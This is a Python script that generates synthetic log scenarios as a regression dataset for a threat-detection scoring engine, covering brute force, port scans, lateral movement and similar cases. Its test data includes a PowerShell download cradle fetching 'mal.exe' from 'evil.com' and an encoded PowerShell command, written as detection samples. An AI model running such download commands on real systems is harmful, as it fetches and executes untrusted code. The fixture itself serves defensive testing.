import json
import random
from datetime import datetime, timezone, timedelta

def get_base_log(id_str):
    return {
        "_id": id_str,
        "@timestamp": datetime.now(timezone.utc).isoformat(),
        "host": {"id": "host-1", "hostname": "WS-01"},
        "user": {"name": "admin"}
    }

scenarios = []

def make_scenario(scen_id, desc, logs, expected_range, level, rules=None, mitre=None):
    return {
        "scenario_id": scen_id,
        "description": desc,
        "raw_logs": logs,
        "expected": {
            "threat_score_range": expected_range,
            "threat_level": level,
            "triggered_rules": rules or [],
            "mitre_techniques": mitre or []
        }
    }

# Clean / Base
s1 = get_base_log("GS-000")
s1["message"] = "SRC=192.168.1.100 DST=192.168.1.200 PROTO=TCP SPT=54321 DPT=3389"
scenarios.append(make_scenario("GS-001", "Clean traffic", [s1], [0.0, 0.4], "low"))

# RULE-001: Brute Force (alert_count > 5, has_credential_access == 1)
logs001 = []
for i in range(6):
    s = get_base_log(f"GS-RULE1-{i}")
    s["kibana"] = {"alert": {"severity": "high", "risk_score": 50, "rule": {"threat": [{"tactic": {"name": "Credential Access"}}]}}}
    logs001.append(s)
scenarios.append(make_scenario("GS-002", "Brute Force", logs001, [0.75, 1.0], "high", ["RULE-001"]))

# RULE-002: Port Scan (unique_dst_port_count > 50, conn_per_minute > 20)
s2_logs = []
for i in range(120): # 120 in 5 mins = 24/min
    s = get_base_log(f"GS-RULE2-{i}")
    s["message"] = f"SRC=10.0.0.5 DST=10.0.0.6 PROTO=TCP SPT={40000+i} DPT={100+i}"
    s["@timestamp"] = (datetime.now(timezone.utc) - timedelta(seconds=i*0.1)).isoformat()
    s2_logs.append(s)
scenarios.append(make_scenario("GS-003", "Port Scan", s2_logs, [0.70, 1.0], "high", ["RULE-002"]))

# RULE-003: LOLBin Execution (has_lolbin == 1, non_interactive_shell == 1)
s3 = get_base_log("GS-RULE3")
s3["process"] = {
    "name": "powershell.exe",
    "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "command_line": "powershell.exe -NoProfile -Command echo 1",
    "interactive": False
}
scenarios.append(make_scenario("GS-004", "LOLBin", [s3], [0.80, 1.0], "critical", ["RULE-003"]))

# RULE-004: Encoded Payload
s4 = get_base_log("GS-RULE4")
s4["process"] = {"name": "cmd.exe", "command_line": "cmd.exe /c powershell.exe -enc SGVsbG8="}
scenarios.append(make_scenario("GS-005", "Encoded", [s4], [0.85, 1.0], "critical", ["RULE-004"]))

# RULE-005: Download Cradle
s5 = get_base_log("GS-RULE5")
s5["process"] = {"name": "powershell.exe", "command_line": "powershell.exe wget http://evil.com/mal.exe"}
scenarios.append(make_scenario("GS-006", "Cradle", [s5], [0.80, 1.0], "critical", ["RULE-005"]))

# RULE-006: Suspicious Parent
s6 = get_base_log("GS-RULE6")
s6["process"] = {"name": "powershell.exe", "parent": {"name": "winword.exe"}, "command_line": "powershell.exe"}
scenarios.append(make_scenario("GS-007", "Suspicious Parent", [s6], [0.90, 1.0], "critical", ["RULE-006"]))

# RULE-007: Exfiltration Signal
s7_net = get_base_log("GS-RULE7-N")
s7_net["message"] = "SRC=10.0.0.1 DST=8.8.8.8 PROTO=TCP SPT=123 DPT=443 IN=eth0"
s7_alert = get_base_log("GS-RULE7-A")
s7_alert["kibana"] = {"alert": {"severity": "high", "risk_score": 50, "rule": {"threat": [{"tactic": {"name": "Exfiltration"}}]}}}
scenarios.append(make_scenario("GS-008", "Exfil", [s7_net, s7_alert], [0.85, 1.0], "critical", ["RULE-007"]))

# RULE-008: Persistence
s8_proc = get_base_log("GS-RULE8-P")
s8_proc["process"] = {"name": "mal.exe", "executable": "C:\\temp\\mal.exe", "command_line": "mal.exe"}
s8_alert = get_base_log("GS-RULE8-A")
s8_alert["kibana"] = {"alert": {"severity": "high", "risk_score": 50, "rule": {"threat": [{"tactic": {"name": "Persistence"}}]}}}
scenarios.append(make_scenario("GS-009", "Persistence", [s8_proc, s8_alert], [0.80, 1.0], "critical", ["RULE-008"]))

# RULE-009: Lateral Movement
s9_logs = []
for i in range(6):
    s = get_base_log(f"GS-RULE9-N{i}")
    s["message"] = f"SRC=10.0.0.1 DST=10.0.0.{10+i} PROTO=TCP SPT=1234 DPT=445"
    s9_logs.append(s)
s9_alert = get_base_log("GS-RULE9-A")
s9_alert["kibana"] = {"alert": {"severity": "high", "risk_score": 50, "rule": {"threat": [{"tactic": {"name": "Lateral Movement"}}]}}}
s9_logs.append(s9_alert)
scenarios.append(make_scenario("GS-010", "Lateral", s9_logs, [0.90, 1.0], "critical", ["RULE-009"]))

# RULE-010: Alert Burst
s10_logs = []
for i in range(15):
    s = get_base_log(f"GS-RULE10-{i}")
    s["kibana"] = {"alert": {"severity": "high", "risk_score": 80, "rule": {"name": "Test"}}}
    s10_logs.append(s)
scenarios.append(make_scenario("GS-011", "Alert Burst", s10_logs, [0.70, 1.0], "high", ["RULE-010"]))

# Generate the remaining up to 50
for i in range(12, 51):
    scen_id = f"GS-{str(i).zfill(3)}"
    s = get_base_log(f"{scen_id}-1")
    s["message"] = f"SRC=10.1.1.{i} DST=10.2.2.{i} PROTO=TCP SPT=12345 DPT={80 + i}"
    scenarios.append(make_scenario(scen_id, f"Clean {i}", [s], [0.0, 0.4], "low"))

import pprint

with open("tests/regression/golden_dataset.py", "w") as f:
    f.write('"""\nGolden dataset for regression testing.\nGenerated programmatically.\n"""\n\n')
    f.write("GOLDEN_SCENARIOS = ")
    f.write(pprint.pformat(scenarios, indent=4))
    f.write("\n")
